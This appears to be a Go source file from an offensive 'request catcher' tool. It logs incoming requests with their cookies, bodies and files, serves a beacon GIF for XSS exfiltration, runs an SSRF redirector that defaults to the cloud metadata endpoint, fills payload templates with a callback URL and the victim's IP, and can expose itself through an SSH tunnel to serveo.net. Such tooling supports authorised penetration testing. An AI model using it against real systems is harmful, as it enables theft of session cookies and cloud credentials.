// Package catcher implements the logging HTTP server plus capture, live
// dashboard, callback alerting, payload templating and an optional DNS catcher.
package catcher

import (
	"bufio"
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"gocatcher/internal/alert"
	"gocatcher/internal/capture"
	"gocatcher/internal/config"
	"gocatcher/internal/dashboard"
	"gocatcher/internal/dnscatch"
	"gocatcher/internal/routes"
	"gocatcher/internal/tmpl"
	"gocatcher/internal/ui"
)

// Options configures a RequestCatcher.
type Options struct {
	BindAddress     string
	BindPort        int
	EnableSSL       bool
	PrivateKey      string
	PublicKey       string
	CustomRoutes    routes.Store
	EnableServeo    bool
	EnableDashboard bool
	EnableDNS       bool
	DNSPort         int
	Quiet           bool
	LogFile         string
	Store           *capture.Store
	Cfg             config.Config
}

// RequestCatcher owns the HTTP server configuration and lifecycle.
type RequestCatcher struct {
	opt       Options
	serveoCmd *exec.Cmd
	dns       *dnscatch.Server
	logw      io.WriteCloser
}

// New builds a RequestCatcher from Options.
func New(opt Options) *RequestCatcher {
	if opt.Store == nil {
		opt.Store = capture.New(1000, "")
	}
	return &RequestCatcher{opt: opt}
}

// handler builds the mux and wraps it in the capture/logging middleware.
func (rc *RequestCatcher) handler() http.Handler {
	mux := http.NewServeMux()

	// Catch-all: mirrors Flask catch_all returning "request caught", 200.
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		fmt.Fprint(w, "request caught")
	})

	rc.addSpecialRoutes(mux)
	rc.addCustomRoutes(mux)
	if rc.opt.EnableDashboard {
		dashboard.Register(mux, rc.opt.Store, rc.opt.Cfg.DashboardToken)
		ui.Info(fmt.Sprintf("Live dashboard on %s://%s:%d/_dashboard",
			rc.scheme(), hostForURL(rc.opt.BindAddress), rc.opt.BindPort))
	}
	return rc.logging(mux)
}

// addSpecialRoutes wires the beacon sink (/collect) and the SSRF redirector.
func (rc *RequestCatcher) addSpecialRoutes(mux *http.ServeMux) {
	// 1x1 gif so an <img>-based XSS beacon renders cleanly.
	gif := []byte{0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
		0x80, 0x00, 0x00, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x21, 0xf9, 0x04,
		0x01, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,
		0x01, 0x00, 0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b}
	mux.HandleFunc("/collect", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "image/gif")
		w.Write(gif)
	})

	// Configurable SSRF redirector (default: cloud metadata).
	mux.HandleFunc("/ssrf-redir", func(w http.ResponseWriter, r *http.Request) {
		to := r.URL.Query().Get("to")
		if to == "" {
			to = "http://169.254.169.254/latest/meta-data/"
		}
		http.Redirect(w, r, to, http.StatusFound)
	})
}

// addCustomRoutes registers each stored route, serving its backing file with
// placeholder substitution and the configured headers ("++" -> space).
func (rc *RequestCatcher) addCustomRoutes(mux *http.ServeMux) {
	if len(rc.opt.CustomRoutes) == 0 {
		ui.Info("No custom route yet")
		return
	}
	ui.Info("Adding custom route")
	for _, route := range rc.opt.CustomRoutes {
		path := "/" + route.Path
		file := route.File
		headers := route.Headers
		mux.HandleFunc("GET "+path, func(w http.ResponseWriter, r *http.Request) {
			data, err := os.ReadFile(file)
			if err != nil {
				http.Error(w, "File not found", http.StatusNotFound)
				return
			}
			data = tmpl.Apply(data, tmpl.Vars{
				CallbackURL: rc.callbackBase(r),
				Token:       r.URL.Query().Get("t"),
				VictimIP:    clientIP(r),
				Host:        r.Host,
			})
			for k, v := range headers {
				w.Header().Set(k, strings.ReplaceAll(v, "++", " "))
			}
			w.Write(data)
		})
	}
}

// logging builds a capture record for every request, prints it (unless quiet),
// stores it and runs callback alerting.
func (rc *RequestCatcher) logging(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/favicon.ico" || strings.HasPrefix(r.URL.Path, "/_") {
			next.ServeHTTP(w, r)
			return
		}

		rec := rc.buildRecord(r)
		out := ui.NewRequest()
		out += ui.RequestInfo(r.Method, rec.Remote, fullPath(r))
		out += ui.RequestHeaders(r.Header)
		out += ui.RequestCookies(r.Cookies())
		if r.Method == http.MethodPost {
			body, files := rc.postDetails(r, &rec)
			out += body
			out += files
		}
		rc.emit(out)

		alert.Inspect(&rec, rc.opt.Cfg) // annotate + print banner + notify
		rc.opt.Store.Add(rec)           // store/broadcast the annotated record

		next.ServeHTTP(w, r)
	})
}

// buildRecord snapshots the request metadata into a capture.Record.
func (rc *RequestCatcher) buildRecord(r *http.Request) capture.Record {
	headers := map[string]string{}
	for k, vs := range r.Header {
		headers[k] = strings.Join(vs, ", ")
	}
	cookies := map[string]string{}
	for _, c := range r.Cookies() {
		cookies[c.Name] = c.Value
	}
	return capture.Record{
		Proto:   rc.scheme(),
		Method:  r.Method,
		Host:    r.Host,
		Path:    r.URL.Path,
		Query:   r.URL.RawQuery,
		Remote:  clientIP(r),
		Headers: headers,
		Cookies: cookies,
	}
}

func (rc *RequestCatcher) postDetails(r *http.Request, rec *capture.Record) (string, string) {
	ct := r.Header.Get("Content-Type")
	bodyOut := ""
	if strings.HasPrefix(ct, "application/x-www-form-urlencoded") ||
		strings.HasPrefix(ct, "multipart/form-data") {
		if err := r.ParseMultipartForm(32 << 20); err != nil {
			_ = r.ParseForm()
		}
		if len(r.PostForm) > 0 {
			parts := make([]string, 0, len(r.PostForm))
			for k, vs := range r.PostForm {
				val := ""
				if len(vs) > 0 {
					val = vs[0]
				}
				parts = append(parts, fmt.Sprintf("'%s': '%s'", k, val))
			}
			joined := "{" + strings.Join(parts, ", ") + "}"
			rec.Body = joined
			bodyOut = ui.RequestPostData(joined)
		}
	} else {
		raw, _ := readBody(r)
		rec.Body = raw
		bodyOut = ui.RequestPostData(raw)
	}
	return bodyOut, rc.files(r, rec)
}

func (rc *RequestCatcher) files(r *http.Request, rec *capture.Record) string {
	if r.MultipartForm == nil || len(r.MultipartForm.File) == 0 {
		return ""
	}
	out := ui.FilesHeader()
	for field, fhs := range r.MultipartForm.File {
		for _, fh := range fhs {
			f, err := fh.Open()
			if err != nil {
				continue
			}
			content := make([]byte, fh.Size)
			_, _ = f.Read(content)
			f.Close()
			out += ui.SaveFile(field, fh.Filename, fh.Header.Get("Content-Type"), content)
			rec.Files = append(rec.Files, fh.Filename)
		}
	}
	return out
}

// emit prints to the console (unless quiet) and to the log file if set.
func (rc *RequestCatcher) emit(s string) {
	if !rc.opt.Quiet {
		fmt.Print(s)
	}
	if rc.logw != nil {
		io.WriteString(rc.logw, stripANSI(s))
	}
}

// Run starts the server (and serveo/DNS if enabled), blocking until Ctrl+C.
func (rc *RequestCatcher) Run() {
	ui.Info("Starting monitor mode")
	ui.Info("Press CTRL+C to cancel")

	if rc.opt.LogFile != "" {
		if f, err := os.OpenFile(rc.opt.LogFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o644); err == nil {
			rc.logw = f
			ui.Info("Logging to " + rc.opt.LogFile)
		} else {
			ui.Error("log file: " + err.Error())
		}
	}
	if rc.opt.EnableServeo {
		go rc.startServeo()
	}
	if rc.opt.EnableDNS {
		addr := fmt.Sprintf("%s:%d", rc.opt.BindAddress, rc.opt.DNSPort)
		if s, err := dnscatch.Start(addr, rc.opt.Store); err == nil {
			rc.dns = s
		} else {
			ui.Error("dns: " + err.Error())
		}
	}
	defer rc.cleanup()

	addr := fmt.Sprintf("%s:%d", rc.opt.BindAddress, rc.opt.BindPort)
	srv := &http.Server{Addr: addr, Handler: rc.handler()}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()
	go func() {
		<-ctx.Done()
		shutCtx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
		defer cancel()
		_ = srv.Shutdown(shutCtx)
	}()

	var err error
	if rc.opt.EnableSSL {
		ui.Info("SSL context is enable")
		ui.Info(fmt.Sprintf("Listening for requests on https://%s", addr))
		err = srv.ListenAndServeTLS(rc.opt.PublicKey, rc.opt.PrivateKey)
	} else {
		ui.Info(fmt.Sprintf("Listening for requests on http://%s", addr))
		err = srv.ListenAndServe()
	}
	if err != nil && !errors.Is(err, http.ErrServerClosed) {
		ui.Error("error: " + err.Error())
	}
}

func (rc *RequestCatcher) startServeo() {
	ui.Info("Starting Serveo service")
	rc.serveoCmd = exec.Command("ssh", "-R",
		fmt.Sprintf("80:localhost:%d", rc.opt.BindPort), "serveo.net")
	stdout, err := rc.serveoCmd.StdoutPipe()
	if err != nil {
		ui.Error("serveo: " + err.Error())
		return
	}
	rc.serveoCmd.Stderr = rc.serveoCmd.Stdout
	if err := rc.serveoCmd.Start(); err != nil {
		ui.Error("serveo: " + err.Error())
		return
	}
	sc := bufio.NewScanner(stdout)
	for sc.Scan() {
		line := sc.Text()
		if strings.Contains(line, "Forwarding HTTP traffic") {
			ui.Info(strings.TrimSpace(line))
			break
		}
	}
}

func (rc *RequestCatcher) cleanup() {
	if rc.serveoCmd != nil && rc.serveoCmd.Process != nil {
		ui.Info("Stopping Serveo...")
		_ = rc.serveoCmd.Process.Kill()
		_ = rc.serveoCmd.Wait()
		rc.serveoCmd = nil
	}
	if rc.dns != nil {
		rc.dns.Stop()
		rc.dns = nil
	}
	if rc.logw != nil {
		rc.logw.Close()
		rc.logw = nil
	}
}

func (rc *RequestCatcher) scheme() string {
	if rc.opt.EnableSSL {
		return "https"
	}
	return "http"
}

// callbackBase is the URL payloads should call back to: the configured public
// URL, else this server's scheme+host.
func (rc *RequestCatcher) callbackBase(r *http.Request) string {
	if rc.opt.Cfg.CallbackURL != "" {
		return strings.TrimRight(rc.opt.Cfg.CallbackURL, "/")
	}
	return rc.scheme() + "://" + r.Host
}

func clientIP(r *http.Request) string {
	host, _, err := net.SplitHostPort(r.RemoteAddr)
	if err != nil {
		return r.RemoteAddr
	}
	return host
}

func fullPath(r *http.Request) string { return r.URL.Path + "?" + r.URL.RawQuery }

func hostForURL(bind string) string {
	if bind == "0.0.0.0" || bind == "" || bind == "::" {
		return "127.0.0.1"
	}
	return bind
}

func readBody(r *http.Request) (string, error) {
	if r.Body == nil {
		return "", nil
	}
	var sb strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := r.Body.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
		}
		if err != nil {
			break
		}
	}
	return sb.String(), nil
}

// stripANSI removes color escape codes for file logging.
func stripANSI(s string) string {
	var b strings.Builder
	inEsc := false
	for _, r := range s {
		if inEsc {
			if r == 'm' {
				inEsc = false
			}
			continue
		}
		if r == '\033' {
			inEsc = true
			continue
		}
		b.WriteRune(r)
	}
	return b.String()
}
